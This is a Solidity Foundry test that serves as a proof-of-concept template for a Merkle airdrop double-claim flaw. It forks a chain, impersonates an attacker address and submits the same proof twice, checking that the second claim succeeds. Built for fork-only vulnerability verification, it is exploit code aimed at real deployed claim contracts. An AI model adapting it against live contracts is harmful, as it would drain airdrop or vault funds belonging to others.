// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Merkle claim double-claim (same proof twice)
/// @notice Claim contracts must mark a proof / nullifier as USED. If the
///         claimed check is missing (or keyed wrong), the SAME Merkle proof
///         claims TWICE -- the attacker drains the airdrop / vault.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set PROOF / AMOUNT / adapt claim()
///      to the target's real claim signature.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: a valid Merkle proof + amount for the attacker on this fork.
    bytes32[] public proof;
    uint256 public constant AMOUNT = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(AMOUNT > 0, "set AMOUNT + proof to a valid claim for the attacker");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // TODO: adapt to the target's real claim signature
        // (claim(proof, amount) / claim(index, amount, proof) / claimEth).
        vm.prank(attackerEOA);
        (bool firstOk,) = target.call(
            abi.encodeWithSignature("claim(bytes32[],uint256)", proof, AMOUNT)
        );
        require(firstOk, "first claim failed -- adapt the claim signature / proof / amount");

        // Same proof, same amount, second time.
        vm.prank(attackerEOA);
        (bool secondOk,) = target.call(
            abi.encodeWithSignature("claim(bytes32[],uint256)", proof, AMOUNT)
        );
        console.log("first claim ok:", firstOk);
        console.log("second claim (same proof) ok:", secondOk);
        assertTrue(secondOk, "exploit did not reproduce: second claim was rejected (claimed check present)");

    }
}
